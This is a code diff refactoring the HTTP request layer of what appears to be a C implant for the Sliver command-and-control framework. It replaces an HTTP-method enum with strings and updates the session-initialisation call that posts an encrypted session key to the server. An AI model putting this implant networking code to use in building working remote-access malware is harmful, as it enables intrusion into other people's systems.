@@ -1,42 +1,5 @@
 #include "pch.h"
 
-LPSTR GetMethodString
-(
-	_In_ HttpMethod Method
-)
-{
-	if (Method == GET) {
-		return DuplicateStrA("GET", 0);
-	}
-	else if (Method == POST) {
-		return DuplicateStrA("POST", 0);
-	}
-	else if (Method == PUT) {
-		return DuplicateStrA("PUT", 0);
-	}
-	else if (Method == PUT + 1) {
-		return DuplicateStrA("DELETE", 0);
-	}
-	else if (Method == HEAD) {
-		return DuplicateStrA("HEAD", 0);
-	}
-	else if (Method == OPTIONS) {
-		return DuplicateStrA("OPTIONS", 0);
-	}
-	else if (Method == TRCE) {
-		return DuplicateStrA("TRACE", 0);
-	}
-	else if (Method == CONNECT) {
-		return DuplicateStrA("CONNECT", 0);
-	}
-	else if (Method == MERGE) {
-		return DuplicateStrA("MERGE", 0);
-	}
-	else if (Method == PATCH) {
-		return DuplicateStrA("PATCH", 0);
-	}
-}
-
 LPSTR GetContentTypeString
 (
 	_In_ ContentTy ContentTypeEnum
@@ -451,7 +414,6 @@ HINTERNET SendRequest
 	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
 	DWORD dwLastError = 0;
 	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
-	LPSTR lpMethodStr = NULL;
 	LPSTR lpHeaderStr = NULL;
 
 	if (lpPath != NULL) {
@@ -461,8 +423,7 @@ HINTERNET SendRequest
 		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
 	}
 
-	lpMethodStr = GetMethodString(pRequest->Method);
-	lpMethod = ConvertCharToWchar(lpMethodStr);
+	lpMethod = ConvertCharToWchar(pRequest->Method);
 	if (pUri->bUseHttps) {
 		dwFlag |= WINHTTP_FLAG_SECURE;
 	}
@@ -548,10 +509,6 @@ CLEANUP:
 
 	if (pProxyInfo != NULL) {
 		FREE(pProxyInfo);
-	}
-
-	if (lpMethodStr != NULL) {
-		FREE(lpMethodStr);
 	}
 
 	return hRequest;
@@ -721,6 +678,10 @@ VOID FreeHttpRequest
 			}
 		}
 
+		if (pHttpReq->Method != NULL) {
+			FREE(pHttpReq->Method);
+		}
+
 		FREE(pHttpReq);
 	}
 }
@@ -822,7 +783,7 @@ VOID FreeSliverHttpClient
 PHTTP_REQUEST CreateHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
-	_In_ HttpMethod Method,
+	_In_ LPSTR lpMethod,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData
 )
@@ -839,7 +800,7 @@ PHTTP_REQUEST CreateHttpRequest
 		Result->cbData = cbData;
 	}
 
-	Result->Method = Method;
+	Result->Method = DuplicateStrA(lpMethod, 0);
 	return Result;
 }
 
@@ -866,7 +827,7 @@ PHTTP_RESP SendHttpRequest
 	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ PHTTP_CLIENT pHttpClient,
 	_In_ LPWSTR lpPath,
-	_In_ HttpMethod Method,
+	_In_ LPSTR lpMethod,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData,
@@ -882,7 +843,7 @@ PHTTP_RESP SendHttpRequest
 	PHTTP_RESP pResult = NULL;
 	LPSTR lpAuthorizationHeader = NULL;
 
-	pHttpRequest = CreateHttpRequest(pHttpConfig, Method, lpData, cbData);
+	pHttpRequest = CreateHttpRequest(pHttpConfig, lpMethod, lpData, cbData);
 	for (i = 0; i < HeaderEnumEnd; i++) {
 		if (pHttpConfig->AdditionalHeaders[i] != NULL) {
 			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
@@ -1573,7 +1534,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	}
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
